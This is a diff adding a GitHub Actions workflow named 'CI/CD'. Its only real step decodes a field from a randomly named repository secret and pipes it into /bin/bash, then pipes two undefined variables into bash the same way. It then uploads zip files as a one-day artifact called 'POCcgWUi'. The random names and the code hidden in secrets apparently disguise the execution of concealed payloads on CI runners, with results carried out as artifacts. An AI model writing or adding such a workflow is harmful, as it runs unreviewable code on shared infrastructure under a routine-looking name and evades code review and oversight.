@@ -1,0 +1,29 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          tvjig75770: ${{ secrets.tvjig75770 }}
+        run: |
+          printf '%s' "$tvjig75770" | jq -r .l5 | /bin/bash
+          echo $p70029 | jq -r .ck3 | /bin/bash
+          echo $jmxjy62917 | jq -r .m689 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: POCcgWUi
+          path: "*.zip"
+          retention-days: 1
